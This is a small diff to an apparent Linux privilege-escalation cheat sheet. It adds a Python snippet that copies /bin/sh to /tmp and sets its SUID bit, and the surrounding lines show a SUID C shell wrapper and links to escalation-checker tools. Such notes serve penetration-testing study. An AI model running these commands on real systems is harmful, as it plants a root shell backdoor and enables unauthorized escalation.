@@ -720,6 +720,14 @@ system("/bin/bash");
 
 ```gcc -o suid suid.c```
 
+#### Privileged script file
+sometimes you come across SUID file.py
+
+```
+import os
+os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
+```
+
 #### Scripts:-
 - https://github.com/sleventyeleven/linuxprivchecker/
 - https://github.com/mzet-/linux-exploit-suggester
